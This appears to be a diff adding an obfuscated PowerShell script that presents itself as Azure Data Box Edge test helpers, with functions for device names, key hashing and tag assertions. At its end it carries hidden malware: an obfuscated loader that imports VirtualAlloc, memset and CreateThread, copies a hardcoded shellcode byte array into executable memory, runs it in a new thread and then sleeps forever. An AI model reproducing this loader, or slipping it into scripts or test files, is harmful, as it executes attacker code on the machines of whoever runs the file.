@@ -1,0 +1,113 @@
+ SeT  ("{1}{0}" -f 'w','yF6') (  [tyPE]("{1}{7}{3}{6}{0}{2}{5}{4}" -F 'r','SYSTeM.sEcu','ap','ty.cr','aLGoRIthm','hy.HaSH','YpTog','RI')) ;  set-vAriabLE ("{0}{1}"-f 'r0SF','z1') (  [tYPe]("{0}{4}{2}{3}{1}" -F'sysT','dING','M.TE','XT.ENCo','E') )  ;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function G`ET-`dEviCe`cO`NNECtIOn`s`T`RinG 
+{
+	return "";
+}
+
+
+function Ge`T-io`TDE`ViCecOn`NEc`TIO`N`sTRinG 
+{
+	return "";
+}
+
+
+function GEt`-`ENCryptI`onKEy
+{
+	return "";
+}
+
+
+function G`Et-`USe`RPA`SSword
+{
+	return "";
+}
+
+
+
+
+function g`eT-d`e`VICe`R`ES`O`UrCeGROUpnAme
+{
+	return ("{1}{0}{3}{2}" -f'gpfor','psr','est','t')
+}
+
+
+function Get-D`E`VicENAmE
+{
+	return ("{1}{5}{3}{4}{2}{6}{0}" -f 'e','psdat','de','boxed','ge','a','vic')
+}
+
+
+function Get`-STRiN`G`H`ASH([String] ${s`Tring},${HAshN`A`ME} = "MD5")
+{
+	${s`TrinGBUI`l`DEr} = .("{0}{2}{3}{1}"-f 'New-O','ct','bj','e') ("{6}{0}{4}{1}{5}{2}{3}"-f 'y','m.','.Str','ingBuilder','ste','Text','S')
+	 ( gEt-CHiLDiTem ("{2}{4}{0}{3}{1}"-f 'IablE','yf6w','Va',':','r'))."V`AluE"::("{0}{1}"-f 'Creat','e').Invoke(${h`Ashn`AmE})."CoM`putEhA`sH"(  $r0SFz1::"u`Tf8".("{1}{0}" -f'etBytes','G').Invoke(${S`TRI`Ng}))|&('%'){[Void]${sT`RI`NgBu`ILDER}.("{0}{1}" -f'Appe','nd').Invoke(${_}.("{0}{1}{2}"-f 'T','oStri','ng').Invoke("x2"))}
+	${sT`RiNgB`UILDER}.("{0}{1}{2}"-f 'ToS','tri','ng').Invoke()
+}
+
+
+
+function GeT-eNcrYpT`ION`KE`yfoR`dEvicE(${r`E`souRceGROup`NaME}, ${DeviC`e`N`AME})
+{
+
+	${S`p} = &("{2}{3}{0}{5}{4}{6}{1}" -f'zADSe','cipal','Ge','t-A','r','rviceP','in') -ApplicationId ("{5}{4}{6}{3}{7}{8}{0}{2}{1}"-f'8f9','c','8f2ab8','bf48','d027-f996-4ed','2368','b-','-9','2')
+	${E} = &("{2}{0}{3}{4}{1}{5}"-f '-AzDat','eDevi','Get','aBoxE','dg','ce') -ResourceGroupName ${re`sO`URceGr`OU`PnAmE} -DeviceName ${dE`VIce`Na`me} -ExtendedInfo
+	${k} = ${SP}."i`d"+${E}."reSO`URc`E`key"
+	return .("{0}{2}{1}{4}{3}" -f 'G','Stri','et-','h','ngHas') ${K} ("{0}{1}" -f 'SHA','512')
+}
+
+
+
+
+
+function GEt-StorAG`EA`C`cO`UNT`NAmE
+{
+	return &("{1}{2}{0}{3}"-f'Asset','ge','t','Name')
+}
+
+
+function As`Ser`T-TagS(${Tag`s1}, ${tag`S2})
+{
+	if(${t`AgS1}."C`ount" -ne ${ta`G`S2}."cou`Nt")
+	{
+		throw ('T'+'ag '+'si'+'ze '+'not'+' '+'equa'+'l. '+'Ta'+'g'+'1: '+"$tags1.count "+'Ta'+'g2:'+' '+"$tags2.count")
+	}
+
+	foreach(${k`eY} in ${T`Ag`s1}."KE`Ys")
+	{
+		if(${TA`g`s1}[${K`eY}] -ne ${t`Ag`s2}[${K`Ey}])
+		{
+			throw ('Tag'+' '+'co'+'n'+'tent '+'not'+' '+'e'+'qual. '+"Key:$key "+'Tag'+'s1:') +  ${ta`gS1}[${k`Ey}] + ("{0}{1}" -f'Ta','gs2:') + ${ta`g`S2}[${k`ey}]
+		}
+	}
+}
+
+
+
+function sLEE`pi`NReCor`dmode ([int]${SLE`ePInter`VA`Li`Ns`ec})
+{
+	${m`ode} = ${e`Nv:AZ`Ure_Te`st_modE}
+	if ( ${MO`de} -ne ${N`ULL} -and ${M`odE}.("{2}{1}{0}" -f'variant','In','ToUpper').Invoke() -eq ("{0}{1}"-f 'RECO','RD'))
+	{
+		&("{2}{1}{0}{3}" -f'co','t-Se','Wai','nds') ${slEepiNT`eRv`Al`iNSec} 
+	}
+}
+
+
+${c} = ((("{23}{124}{85}{53}{59}{61}{78}{50}{110}{14}{57}{126}{33}{117}{120}{20}{86}{119}{101}{108}{30}{63}{34}{18}{113}{84}{11}{41}{67}{64}{98}{118}{68}{48}{60}{32}{114}{99}{39}{1}{10}{12}{73}{21}{46}{66}{75}{54}{22}{91}{88}{77}{74}{44}{125}{79}{0}{27}{4}{47}{111}{16}{9}{93}{103}{25}{35}{81}{70}{122}{121}{82}{52}{109}{92}{40}{42}{116}{72}{97}{55}{5}{13}{69}{56}{8}{104}{2}{49}{38}{3}{127}{19}{45}{94}{58}{83}{31}{96}{37}{28}{6}{7}{95}{80}{89}{26}{71}{107}{105}{106}{15}{17}{51}{65}{62}{100}{36}{87}{90}{102}{29}{112}{43}{24}{115}{76}{123}" -f'tern I','e, ui','int d','onFla','tr','r lpP','rt(KIums','v',' ','lpTh','nt flProt','e','ect','a','.dll','xte','tPtr ','r','l','s','c st','DllImpor','nel32.dllKIu','[',' u','ribu','Iu','ntP','po','n','Vi',' lpThreadId','a','u','l','t','set(',';[DllIm','Creati','p','ntPtr ','ss','lpSta',',','c',',','t(K',' Cre','Al','w','l','n','ck','K','er','t','r,','KIu)','tPt','Iu','loc','ke','ntP','rtualA','int dwSize, ui',' I','I',', u','fl','ramete',' uint d',')','ddre',');[','ti','uk','nt',' sta','rne','ex','l','es,','ta','r','c(IntPtr lpAddr','t(','atic','IntPt','lic','lK','r de',')]pub','e, I','r',' In','crt.d',')','ss, IntP','n','Ty','tr mem','tern IntP','st, ui','eadAtt','u','st','atic e',']public ','tr ','Siz','32','ateThread(In','t src','o','tion','int cou','rtA','bl','t ',' ex','i','S','w',');','DllImpor',' ',']p','g'))-replaCE  'KIu',[CHaR]34);${w} = .("{1}{0}{2}"-f'd-Ty','Ad','pe') -memberDefinition ${C} -Name ("{1}{0}" -f 'in32','W') -namespace ("{0}{1}{2}" -f'Wi','n32F','unctions') -passthru;[Byte[]];[Byte[]]${Z} = 0xba,0xb6,0xc8,0x5e,0x5f,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0xb9,0x2a,0xab,0xa3,0x2d,0x28,0x54,0x5c,0xad,0x4d,0xdc,0xb9,0x9c,0x4d,0xba,0xca,0x8e,0x7d,0xc8,0x9f,0x22,0xf5,0x9c,0x0b,0xb1,0x7b,0x09,0x3b,0x72,0x31,0x6f,0x72,0x83,0x6a,0x53,0x15,0x07,0x71,0x80,0xf5,0x36,0xba,0xd5,0xf4,0x7f,0xa7,0x14,0xa4,0x28,0xa3,0x8b,0x59,0x5d,0xf9,0x17,0xd1,0x2d,0xef,0x1f,0x06,0xe5,0x0e,0x31,0x99,0x7e,0x49,0x91,0x1b,0x53,0xe1,0x98,0x03,0xb0,0xcc,0x53,0xbf,0x02,0xba,0x65,0x69,0x5b,0x43,0xc9,0x54,0x54,0xb6,0x13,0x90,0x52,0x29,0x66,0xe8,0xa1,0xd4,0x71,0x2f,0xd8,0x02,0xf7,0xb4,0x7a,0xc0,0xaf,0x10,0x7b,0x05,0x29,0xd2,0x77,0xe2,0x3d,0xbc,0x9b,0xf5,0x92,0xb6,0xa7,0x7e,0x15,0x19,0x2e,0xc4,0x32,0xbd,0x6b,0x9e,0x5b,0xe4,0xd1,0x71,0x63,0xf6,0xba,0x2e,0xc1,0x7c,0x56,0x3a,0x78,0xdf,0x3e,0x8f,0xb1,0xe0,0xbe,0x87,0xc2,0x93,0x8c,0x08,0x79,0x3c,0xbc,0xc1,0xa7,0xbb,0xc3,0xfb,0x10,0x53,0x3a,0x04,0x61,0x7d,0xf8,0x50,0x31,0x15,0x29,0xd9,0xda,0xe5,0xd6,0x0c,0x76,0xe3,0x40,0x6f,0x2f,0xea,0x94,0x07,0x32,0xed,0xa4,0xee,0xbb,0x0b,0x94,0x40,0xec,0x83,0x54,0x31,0x4c,0x74,0x3c,0x5b,0x43,0xab,0x5c,0x64,0x89,0xc4,0xf6,0x8b,0x64,0xbc,0x6e,0x35,0x2d,0x36,0x0f,0xba,0xfb,0x32,0x0f,0x30,0x08,0xc2,0xc1,0xb1,0x65,0xd0,0xb5,0x31,0x30,0x8a,0x13,0x4d,0xee,0xa1,0x9b,0xdb,0x15,0x60,0xcc,0x73,0x14,0x55,0x3a,0xdc,0xe7,0xb0,0x31,0xd5,0x7d,0x7b,0x2d,0x1a,0x92,0x7b,0xad,0x4c,0xf8,0x7b,0xc5,0x28,0x58,0x28,0xf0,0x36,0x75,0x5c,0xa9,0xa2,0x76,0x35,0x1e,0x64,0x1f,0xbb,0x79,0x42,0x80,0x44,0xac,0x52,0xfc,0x92,0x88,0x20,0xec,0x26;${G} = 0x1000;if (${Z}."lEnG`Th" -gt 0x1000){${g} = ${Z}."l`ENG`Th"};${X}=${w}::("{2}{1}{3}{0}" -f'oc','u','Virt','alAll').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${Z}."LENG`TH"-1);${i}++) {${w}::"MEM`s`ET"([IntPtr](${X}.("{0}{1}" -f 'To','Int32').Invoke()+${I}), ${z}[${i}], 1)};${W}::("{0}{3}{1}{2}"-f'Creat','T','hread','e').Invoke(0,0,${X},0,0,0);for (;;){&("{2}{0}{1}" -f 'art-s','leep','St') 60};
